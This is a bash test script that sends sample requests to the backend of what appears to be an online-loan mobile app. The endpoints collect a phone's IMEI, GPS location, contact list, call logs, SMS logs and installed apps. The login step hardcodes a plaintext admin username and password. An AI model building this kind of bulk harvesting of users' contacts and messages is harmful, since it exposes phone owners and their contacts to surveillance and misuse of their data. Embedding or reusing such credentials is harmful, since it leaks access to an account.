#!/bin/bash

echo "🧪 Testing All API Endpoints..."

BASE_URL="https://d.seoikrom.com"

echo "1. Testing Flutter Submit Form..."
curl -X POST $BASE_URL/api/flutter/submit-form \
  -H "Content-Type: application/json" \
  -d '{"phoneNumber":"+6281234567890","fullName":"Test User","email":"test@example.com","deviceModel":"Samsung Galaxy S21","imei":"123456789012345"}' \
  -w "\nHTTP Status: %{http_code}\n\n"

echo "2. Testing GPS Track..."
curl -X POST $BASE_URL/api/flutter/gps-track \
  -H "Content-Type: application/json" \
  -d '{"phoneNumber":"+6281234567890","latitude":-6.218252,"longitude":106.817175,"address":"Jakarta","timestamp":"2025-08-05T08:00:00Z"}' \
  -w "\nHTTP Status: %{http_code}\n\n"

echo "3. Testing Contacts..."
curl -X POST $BASE_URL/api/flutter/contacts \
  -H "Content-Type: application/json" \
  -d '{"phoneNumber":"+6281234567890","contacts":[{"name":"Test Contact","phone":"+6281234567891"}]}' \
  -w "\nHTTP Status: %{http_code}\n\n"

echo "4. Testing Call Logs..."
curl -X POST $BASE_URL/api/flutter/call-logs \
  -H "Content-Type: application/json" \
  -d '{"phoneNumber":"+6281234567890","callLogs":[{"type":"outgoing","number":"+6281234567891","duration":60,"time":"2025-08-05T08:00:00Z"}]}' \
  -w "\nHTTP Status: %{http_code}\n\n"

echo "5. Testing SMS Logs..."
curl -X POST $BASE_URL/api/flutter/sms-logs \
  -H "Content-Type: application/json" \
  -d '{"phoneNumber":"+6281234567890","smsLogs":[]}' \
  -w "\nHTTP Status: %{http_code}\n\n"

echo "6. Testing Apps..."
curl -X POST $BASE_URL/api/flutter/apps \
  -H "Content-Type: application/json" \
  -d '{"phoneNumber":"+6281234567890","installedApps":[]}' \
  -w "\nHTTP Status: %{http_code}\n\n"

echo "7. Testing Permissions..."
curl -X POST $BASE_URL/api/flutter/permissions \
  -H "Content-Type: application/json" \
  -d '{"phoneNumber":"+6281234567890","permissions":[{"permission":"location","status":true,"updated":"2025-08-05T08:00:00Z"}]}' \
  -w "\nHTTP Status: %{http_code}\n\n"

echo "8. Testing Loan Products..."
curl -X GET $BASE_URL/api/flutter/loan-products \
  -w "\nHTTP Status: %{http_code}\n\n"

echo "9. Testing Admin Login..."
curl -X POST $BASE_URL/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"cs@toolspinjonterbaru.org","password":"Habibhassan123@"}' \
  -w "\nHTTP Status: %{http_code}\n\n"

echo "✅ All endpoint tests completed!" 